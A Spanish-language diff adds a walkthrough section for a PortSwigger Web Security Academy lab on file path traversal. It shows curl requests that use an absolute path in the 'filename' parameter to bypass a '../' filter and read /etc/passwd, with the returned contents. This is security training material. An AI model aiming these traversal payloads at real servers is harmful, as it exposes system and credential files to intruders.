@@ -71,3 +71,41 @@ Y si vamos a la pagina del laboratio vemos que ya la tenemos resuelta :D
 ![](img3.png)
 
 ## 2. Lab: File path traversal, traversal sequences blocked with absolute path bypass
+
+Revisando el codigo fuente encontramos lo siguiente:
+
+```html
+<img src="/image?filename=64.jpg">
+```
+
+Por como resolvimos el ejemplo anterior vemos que podemos obtener  el fichero en la siguiente url:
+
+```bash
+https://ac041fee1e13e3c0801b0bab000c00e2.web-security-academy.net/image?filename=64.jpg
+```
+
+Lo que haremos será hacer la consulta por **curl** del fichero **../../../etc/passwd**, pero obtenemos el siguiente error:
+
+```bash
+└──╼ $curl 'https://ac041fee1e13e3c0801b0bab000c00e2.web-security-academy.net/image?filename=../../../etc/passwd'
+"No such file"
+```
+
+Al parecer existe alguna seguridad con respecto al Directory traversal, y lo que hace puede que sea filtrar por la cadena **../** , lo que podemos hacer es usar una ruta absoluta como la siguiente.
+
+```bash
+└──╼ $curl 'https://ac041fee1e13e3c0801b0bab000c00e2.web-security-academy.net/image?filename=/etc/passwd'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+.....
+```
+
+## 3. Lab: File path traversal, traversal sequences stripped non-recursively
+
